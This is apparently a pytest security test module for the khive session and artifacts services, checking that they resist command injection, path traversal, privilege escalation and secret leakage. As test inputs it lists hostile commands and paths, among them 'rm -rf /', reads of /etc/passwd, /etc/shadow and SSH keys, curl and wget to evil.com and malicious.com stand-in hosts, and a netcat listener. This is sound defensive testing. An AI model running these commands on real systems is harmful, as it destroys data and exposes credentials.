"""Authentication and Authorization Security Tests for khive services.

This module provides comprehensive security testing for authentication and authorization
mechanisms across khive services including:
- Session management security
- Access control validation
- Token handling security
- Permission escalation prevention
- Authentication bypass attempts
- Authorization boundary enforcement
"""

import json
import os
import tempfile
import time
from pathlib import Path
from unittest.mock import MagicMock, Mock, patch
from urllib.parse import quote

import pytest

from khive.services.artifacts.service import ArtifactsService
from khive.services.session.session import DiaryWritingAssistant, SessionInitializer
from khive.services.session.session_service import SessionService


class TestSessionAuthenticationSecurity:
    """Test authentication security for session management."""

    def test_session_command_injection_prevention(self):
        """Test prevention of command injection in session operations."""
        initializer = SessionInitializer()

        # Test malicious command injection attempts
        malicious_commands = [
            ["git", "status; rm -rf /"],
            ["gh", "issue list; cat /etc/passwd"],
            ["git", "log --oneline -3 && malicious_command"],
            ["gh", "; whoami"],
            ["git", "branch | dangerous_pipe"],
            ["gh", "issue list`malicious_backtick`"],
            ["git", "status$(evil_substitution)"],
            ["gh", "&background_attack"],
        ]

        for malicious_cmd in malicious_commands:
            # Should reject or sanitize malicious commands
            success, output = initializer.run_command(malicious_cmd)

            # Either should fail safely or output should not contain dangerous patterns
            if success:
                dangerous_patterns = [
                    "/etc/passwd",
                    "uid=",
                    "gid=",
                    "root",
                    "admin",
                    "malicious",
                    "dangerous",
                    "evil",
                    "attack",
                ]
                for pattern in dangerous_patterns:
                    assert (
                        pattern not in output.lower()
                    ), f"Command injection detected: {pattern} in output"

    def test_session_path_traversal_prevention(self):
        """Test prevention of path traversal in session file operations."""
        initializer = SessionInitializer()

        # Test path traversal attempts in diary and summary loading
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "diary_20231201/../../../sensitive_file",
            "summary_20231201_120000/../../../etc/hosts",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "diary_\x00../../../etc/passwd",
            "summary_\n../../../root/.bashrc",
        ]

        for malicious_path in traversal_paths:
            # Should not access files outside intended directories
            with patch("pathlib.Path.exists") as mock_exists:
                mock_exists.return_value = True
                with patch("pathlib.Path.read_text") as mock_read:
                    mock_read.side_effect = OSError("Access denied")

                    # Should handle path traversal gracefully
                    try:
                        # Test diary processing
                        assistant = DiaryWritingAssistant()
                        assistant.summaries_dir = Path(malicious_path).parent
                        result = assistant.find_unprocessed_summaries()
                        assert isinstance(result, dict)

                        # Should not access sensitive files
                        assert "/etc/passwd" not in str(result)
                        assert "System32" not in str(result)

                    except (OSError, ValueError, TypeError):
                        # Expected - should reject malicious paths
                        pass

    def test_session_file_permission_validation(self):
        """Test file permission validation in session operations."""
        initializer = SessionInitializer()

        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Create test files with various permissions
            test_files = [
                (temp_path / "readable.md", 0o644),
                (temp_path / "executable.md", 0o755),
                (temp_path / "restricted.md", 0o600),
                (temp_path / "no_read.md", 0o000),
            ]

            for file_path, mode in test_files:
                file_path.touch()
                file_path.chmod(mode)

            # Should handle permission restrictions gracefully
            for file_path, expected_mode in test_files:
                try:
                    content = file_path.read_text()
                    # If readable, should not expose sensitive information
                    sensitive_patterns = ["password", "secret", "key", "token"]
                    for pattern in sensitive_patterns:
                        assert pattern not in content.lower()
                except PermissionError:
                    # Expected for restricted files
                    pass

    def test_session_git_operation_security(self):
        """Test security of git operations in session management."""
        initializer = SessionInitializer()

        # Mock git operations to test security
        with patch.object(initializer, "run_command") as mock_run:
            # Test that git commands are properly validated
            mock_run.return_value = (True, "safe output")

            # Should only execute safe git commands
            safe_git_ops = [
                ["git", "status", "--porcelain"],
                ["git", "branch", "--show-current"],
                ["git", "log", "--oneline", "-3"],
            ]

            for cmd in safe_git_ops:
                success, output = initializer.run_command(cmd)
                # Verify command path resolution is used
                mock_run.assert_called()

        # Test command path resolution security
        with patch("shutil.which") as mock_which:
            mock_which.return_value = None  # Command not found

            success, output = initializer.run_command(["fake_git", "status"])
            assert not success
            assert "not found in PATH" in output

    @pytest.mark.parametrize(
        "malicious_branch",
        [
            "main; rm -rf /",
            "main`cat /etc/passwd`",
            "main$(whoami)",
            "main|dangerous_command",
            "main&background_process",
            "main\nmalicious_newline",
            "main\rcarriage_return",
            "main\tmalicious_tab",
        ],
    )
    def test_git_branch_injection_prevention(self, malicious_branch):
        """Test prevention of injection attacks through git branch names."""
        initializer = SessionInitializer()

        with patch.object(initializer, "run_command") as mock_run:
            # Simulate malicious branch name in git output
            mock_run.return_value = (True, malicious_branch)

            git_status = initializer.get_git_status()

            # Branch name should be sanitized or rejected
            if "branch" in git_status:
                branch_name = git_status["branch"]
                dangerous_chars = [";", "`", "$", "|", "&", "\n", "\r", "\t"]
                for char in dangerous_chars:
                    assert (
                        char not in branch_name
                    ), f"Dangerous character {repr(char)} not filtered"


class TestSessionAuthorizationSecurity:
    """Test authorization security for session operations."""

    def test_directory_access_authorization(self):
        """Test authorization for directory access in session operations."""
        assistant = DiaryWritingAssistant()

        # Should only access authorized directories
        authorized_dirs = [".khive/notes/summaries", ".khive/notes/diaries"]

        for auth_dir in authorized_dirs:
            # Should be able to access authorized directories
            test_dir = Path(auth_dir)
            try:
                if test_dir.exists():
                    # Should handle authorized access properly
                    files = list(test_dir.glob("*.md"))
                    assert isinstance(files, list)
            except PermissionError:
                # Expected if directory doesn't exist or no permission
                pass

    def test_file_modification_authorization(self):
        """Test authorization for file modification operations."""
        with tempfile.TemporaryDirectory() as temp_dir:
            assistant = DiaryWritingAssistant()
            assistant.summaries_dir = Path(temp_dir) / "summaries"
            assistant.summaries_dir.mkdir()

            # Create test summary file
            test_summary = assistant.summaries_dir / "summary_20231201_120000.md"
            test_summary.write_text("main_topic: test\nduration: 1h\n- key point")

            # Should only modify authorized files
            summaries = assistant.find_unprocessed_summaries()

            if summaries:
                date_summaries = list(summaries.values())[0]
                # Should be able to mark as processed (authorized operation)
                assistant.mark_summaries_processed(date_summaries)

                # Verify file was modified appropriately
                content = test_summary.read_text()
                assert "processed: true" in content

    def test_github_api_authorization(self):
        """Test authorization for GitHub API operations."""
        initializer = SessionInitializer()

        with patch.object(initializer, "run_command") as mock_run:
            # Test that GitHub operations require proper authorization
            mock_run.return_value = (False, "authentication required")

            # Should handle authorization failures gracefully
            issues = initializer.get_open_issues()
            assert isinstance(issues, list)
            assert len(issues) == 0  # Should return empty list on auth failure

    def test_sensitive_data_access_control(self):
        """Test access control for sensitive data in session operations."""
        initializer = SessionInitializer()

        # Should not expose sensitive information in outputs
        with patch.object(initializer, "run_command") as mock_run:
            # Simulate output with sensitive patterns
            mock_run.return_value = (
                True,
                "password: secret123\ntoken: abc123\nkey: xyz789",
            )

            git_status = initializer.get_git_status()

            # Should filter out sensitive information
            status_str = str(git_status)
            sensitive_patterns = ["password:", "token:", "key:", "secret"]
            for pattern in sensitive_patterns:
                assert (
                    pattern not in status_str.lower()
                ), f"Sensitive data exposed: {pattern}"


class TestServiceAuthenticationSecurity:
    """Test authentication security for khive services."""

    def test_artifacts_service_authentication(self):
        """Test authentication mechanisms for artifacts service."""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace_dir = Path(temp_dir)

            # Test service initialization with secure workspace
            service = ArtifactsService(workspace_dir)

            # Should initialize securely without exposing sensitive data
            assert service.workspace_dir == workspace_dir
            assert service.workspace_dir.exists()

            # Test that service methods require proper authentication context
            session_id = "test_session_123"

            try:
                # Should validate session before operations
                service.create_session(session_id)
                assert session_id in service.sessions
            except Exception as e:
                # Service may require additional authentication context
                assert "auth" in str(e).lower() or "permission" in str(e).lower()

    def test_session_service_authentication(self):
        """Test authentication for session service operations."""
        # Test session service authentication
        service = SessionService()

        # Should not allow unauthorized session operations
        malicious_session_ids = [
            "../../../etc/passwd",
            "session; rm -rf /",
            "session`malicious`",
            "session$(whoami)",
            "session|dangerous",
            "session&background",
            "session\x00null",
            "session\ninjection",
        ]

        for malicious_id in malicious_session_ids:
            try:
                # Should reject malicious session IDs
                result = service.get_session_context(malicious_id)
                if result:
                    # If not rejected, should not contain dangerous content
                    result_str = str(result)
                    assert "/etc/passwd" not in result_str
                    assert "uid=" not in result_str
                    assert "malicious" not in result_str
            except (ValueError, TypeError, SecurityError):
                # Expected - should reject malicious inputs
                pass

    def test_cross_service_authentication(self):
        """Test authentication between different khive services."""
        # Test that services properly authenticate with each other
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace_dir = Path(temp_dir)
            artifacts_service = ArtifactsService(workspace_dir)
            session_service = SessionService()

            # Services should not share sensitive authentication data
            artifacts_state = str(artifacts_service.__dict__)
            session_state = str(session_service.__dict__)

            # Should not expose authentication tokens or passwords
            sensitive_patterns = [
                "password",
                "passwd",
                "secret",
                "token",
                "key",
                "auth",
                "jwt",
                "bearer",
                "api_key",
                "credential",
            ]

            for pattern in sensitive_patterns:
                assert pattern not in artifacts_state.lower()
                assert pattern not in session_state.lower()


class TestAuthorizationBypassPrevention:
    """Test prevention of authorization bypass attempts."""

    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attacks."""
        initializer = SessionInitializer()

        # Test that session operations don't allow privilege escalation
        with (
            patch("os.setuid") as mock_setuid,
            patch("os.setgid") as mock_setgid,
            patch("os.seteuid") as mock_seteuid,
        ):
            # Should not attempt to change user/group IDs
            initializer.initialize()

            mock_setuid.assert_not_called()
            mock_setgid.assert_not_called()
            mock_seteuid.assert_not_called()

    def test_file_system_privilege_bypass(self):
        """Test prevention of file system privilege bypass."""
        assistant = DiaryWritingAssistant()

        # Test that file operations don't bypass permissions
        restricted_files = [
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "/var/log/auth.log",
            "C:\\Windows\\System32\\config\\SAM",
            "/System/Library/Keychains/System.keychain",
        ]

        for restricted_file in restricted_files:
            restricted_path = Path(restricted_file)

            # Should not be able to access restricted system files
            try:
                content = restricted_path.read_text()
                # If somehow readable, should not contain sensitive patterns
                sensitive_patterns = ["password", "hash", "key", "secret", "token"]
                for pattern in sensitive_patterns:
                    assert (
                        pattern not in content.lower()
                    ), f"Sensitive data in {restricted_file}"
            except (PermissionError, FileNotFoundError, OSError):
                # Expected - should not have access to restricted files
                pass

    def test_environment_variable_security(self):
        """Test security of environment variable handling."""
        # Test that sensitive environment variables are not exposed
        sensitive_env_vars = [
            "PASSWORD",
            "SECRET",
            "TOKEN",
            "KEY",
            "API_KEY",
            "GITHUB_TOKEN",
            "JWT_SECRET",
            "DATABASE_PASSWORD",
            "PRIVATE_KEY",
            "CREDENTIAL",
            "AUTH_TOKEN",
        ]

        # Mock environment with sensitive variables
        with patch.dict(
            os.environ, {var: f"secret_{var.lower()}" for var in sensitive_env_vars}
        ):
            initializer = SessionInitializer()
            output = initializer.initialize()

            # Output should not contain sensitive environment values
            for var in sensitive_env_vars:
                secret_value = f"secret_{var.lower()}"
                assert secret_value not in output, f"Sensitive env var exposed: {var}"

    def test_command_execution_authorization(self):
        """Test authorization for command execution."""
        initializer = SessionInitializer()

        # Test that only authorized commands can be executed
        unauthorized_commands = [
            ["rm", "-rf", "/"],
            ["cat", "/etc/passwd"],
            ["sudo", "whoami"],
            ["chmod", "777", "/etc"],
            ["curl", "http://malicious.com/steal_data"],
            ["wget", "http://evil.com/backdoor.sh"],
            ["nc", "-l", "1234"],
            ["python", "-c", "import os; os.system('rm -rf /')"],
        ]

        for unauthorized_cmd in unauthorized_commands:
            success, output = initializer.run_command(unauthorized_cmd)

            # Should either fail or be safely handled
            if success:
                # If command somehow succeeded, output should not contain dangerous results
                dangerous_patterns = ["root:", "uid=0", "password", "secret"]
                for pattern in dangerous_patterns:
                    assert pattern not in output.lower()


class TestSecurityEventLogging:
    """Test security event logging and monitoring."""

    def test_authentication_failure_logging(self):
        """Test that authentication failures are properly logged."""
        # Test logging of authentication failures
        with patch("logging.getLogger") as mock_logger:
            mock_log = Mock()
            mock_logger.return_value = mock_log

            service = SessionService()

            # Attempt unauthorized operation
            try:
                service.get_session_context("../../../malicious_session")
            except Exception:
                pass

            # Should log security events (implementation dependent)
            # At minimum, should not crash silently

    def test_authorization_bypass_logging(self):
        """Test logging of authorization bypass attempts."""
        initializer = SessionInitializer()

        with patch("logging.getLogger") as mock_logger:
            mock_log = Mock()
            mock_logger.return_value = mock_log

            # Attempt privilege escalation
            malicious_commands = [
                ["sudo", "whoami"],
                ["su", "root"],
                ["chmod", "777", "/etc"],
            ]

            for cmd in malicious_commands:
                initializer.run_command(cmd)

            # Should log security attempts (implementation dependent)


class SecurityError(Exception):
    """Custom security exception for testing."""

    pass


@pytest.fixture
def temp_workspace():
    """Provide a temporary workspace for security tests."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


@pytest.fixture
def mock_secure_session():
    """Provide a mock secure session for testing."""
    session = Mock()
    session.id = "secure_test_session_123"
    session.is_authenticated = True
    session.permissions = ["read", "write"]
    return session


@pytest.fixture
def mock_restricted_session():
    """Provide a mock restricted session for testing."""
    session = Mock()
    session.id = "restricted_test_session_456"
    session.is_authenticated = True
    session.permissions = ["read"]
    return session


class TestSecurityIntegrationScenarios:
    """Test end-to-end security scenarios across services."""

    def test_multi_service_authentication_flow(self, temp_workspace):
        """Test authentication flow across multiple services."""
        # Initialize services
        artifacts_service = ArtifactsService(temp_workspace)
        session_service = SessionService()

        # Test coordinated authentication
        session_id = "integration_test_session"

        # Should maintain consistent authentication state
        try:
            artifacts_service.create_session(session_id)
            session_context = session_service.get_session_context(session_id)

            # Authentication state should be consistent
            assert session_id in str(artifacts_service.sessions)

        except Exception as e:
            # Services may require additional setup - should fail gracefully
            assert not any(
                pattern in str(e).lower() for pattern in ["crash", "panic", "fatal"]
            )

    def test_cross_service_authorization_boundaries(self, temp_workspace):
        """Test that services maintain proper authorization boundaries."""
        # Test that services don't share unauthorized data
        artifacts_service = ArtifactsService(temp_workspace)

        # Create test session with restricted access
        restricted_session = "restricted_session_123"

        try:
            artifacts_service.create_session(restricted_session)

            # Should not access other sessions' data
            sessions = artifacts_service.sessions

            # Each session should be isolated
            for session_id, session_data in sessions.items():
                if session_id != restricted_session:
                    # Should not have access to other session data
                    assert restricted_session not in str(session_data)

        except Exception:
            # Expected - service may enforce additional restrictions
            pass

    def test_security_regression_prevention(self):
        """Test prevention of known security regression patterns."""
        # Test common security regression patterns
        regression_patterns = [
            {"type": "path_traversal", "payload": "../../../etc/passwd"},
            {"type": "command_injection", "payload": "; rm -rf /"},
            {"type": "null_byte_injection", "payload": "session\x00malicious"},
            {"type": "environment_injection", "payload": "${PATH}"},
            {"type": "unicode_bypass", "payload": "session\u202e\u202d"},
        ]

        for pattern in regression_patterns:
            payload = pattern["payload"]

            # Test across different services
            services = [SessionService(), SessionInitializer()]

            for service in services:
                try:
                    # Test service-specific methods with malicious payload
                    if hasattr(service, "get_session_context"):
                        result = service.get_session_context(payload)
                        if result:
                            # Should not contain dangerous content
                            result_str = str(result)
                            assert "/etc/passwd" not in result_str
                            assert "uid=" not in result_str

                except (ValueError, TypeError, SecurityError, OSError):
                    # Expected - should reject malicious payloads
                    pass
